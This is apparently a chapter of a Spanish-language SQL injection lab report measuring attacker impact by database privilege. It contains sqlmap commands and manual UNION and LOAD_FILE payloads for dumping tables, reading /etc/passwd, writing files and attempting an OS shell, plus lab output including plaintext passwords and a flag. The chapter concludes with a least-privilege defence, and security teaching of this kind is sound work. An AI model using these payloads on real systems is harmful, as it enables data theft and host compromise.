# 04 — Evaluación de impacto

Objetivo: medir hasta dónde llega un atacante una vez confirmada la inyección. El
alcance depende de los **privilegios del usuario de base de datos** (clave para la
mitigación de infraestructura del capítulo 07).

## 4.1 — Extracción del esquema (reconocimiento)
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch --dbs
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb --tables
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T users --columns
```
Manual (UNION):
```
/?q=zzz' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -
```

## 4.2 — Volcado de datos (dump)
```
sqlmap ... -D shopdb -T users   --dump
sqlmap ... -D shopdb -T secrets --dump
```
Evidencia obtenida en el laboratorio (vía UNION manual), la tabla `users` revela
usuarios y **contraseñas en texto plano** (`pass_plain`) y hashes bcrypt:
```
admin   | Adm1n!Pass2024 | $2a$10$...   | admin
jlopez  | juan1234       | $2a$10$...   | user
...
```
Y la tabla `secrets` incluye el objetivo final:
```
FLAG{sqli_orm_mal_usado_=_rce_potencial}
```

## 4.3 — Usuario y privilegios de la BD
```
sqlmap ... --current-user --current-db --is-dba --privileges
```
En `app-vuln` el usuario es `app_root@%`, **is-dba: True**, con privilegio **FILE**.
Comprobación directa:
```
SELECT * FROM information_schema.user_privileges WHERE grantee="'app_root'@'%'";
-- incluye FILE
```

## 4.4 — Lectura/escritura de archivos (privilegio FILE)
Con `FILE`, la inyección trasciende la BD y toca el **sistema de archivos** del host
de la base de datos.

### Lectura
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch --file-read=/etc/passwd
```
Manual (UNION + LOAD_FILE, ruta en hex para evitar comillas):
```
/?q=zzz' UNION SELECT LOAD_FILE(0x2f6574632f706173737764),2,3,4,5,6-- -
-- 0x2f6574632f706173737764 = /etc/passwd
```
Evidencia del lab: `LOAD_FILE('/etc/passwd')` devolvió **575 bytes**;
`LOAD_FILE('/etc/hostname')` devolvió el id del contenedor de la BD.

### Escritura
```
sqlmap ... --file-write=shell.txt --file-dest=/var/lib/mysql-files/shell.txt
```
o manual: `... INTO OUTFILE '/var/lib/mysql-files/x'`. Requiere `FILE` y que
`secure_file_priv` lo permita (en este lab está vacío = sin restricción).

## 4.5 — Ejecución de comandos en el SO (`--os-shell`)
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch --os-shell
```
**Condiciones necesarias (y por qué aquí es un "intento"):**
- Requiere privilegio `FILE` + (típicamente) *stacked queries* y conocer una ruta
  escribible. En stack **Node + MySQL**, el webshell clásico por `INTO OUTFILE` **no
  se ejecuta** (Node no interpreta PHP/JSP). La vía viable sería **UDF** (`sys_exec`)
  cargando `lib_mysqludf_sys` en el *plugin dir*, lo que depende del SO del contenedor
  MySQL y no siempre concreta.
- Por eso el trabajo lo plantea como **intento** y se analiza **según permisos**:
  - En `app-vuln` (`app_root`, `FILE`, `multipleStatements:true`) se dan las
    precondiciones → `--file-read/--file-write` funcionan (techo de impacto demostrado).
  - En `app-secure` (`app_least`, sin `FILE`) → `--os-shell`, `--file-read` y
    `--file-write` **fallan**.

> **Nota didáctica:** aunque el UDF no "popee" una shell en todos los entornos, la
> lectura/escritura arbitraria de archivos con `FILE` ya representa compromiso total
> del host de BD (robo de claves, sobre-escritura de configs, movimiento lateral).

## 4.6 — Resumen de impacto por privilegio

| Capacidad | `app_root` (vuln) | `app_least` (secure) |
|---|---|---|
| Leer/volcar cualquier tabla | ✅ | ✅ sólo si hubiera inyección (no la hay) |
| `--is-dba` | ✅ True | ❌ False |
| `LOAD_FILE` / `--file-read` | ✅ | ❌ (NULL, sin `FILE`) |
| `INTO OUTFILE` / `--file-write` | ✅ | ❌ |
| `--os-shell` (intento UDF) | ⚠️ precondiciones dadas | ❌ |

La conclusión operativa: **el mínimo privilegio reduce drásticamente el impacto** aun
cuando existiera una inyección (capítulo 07).
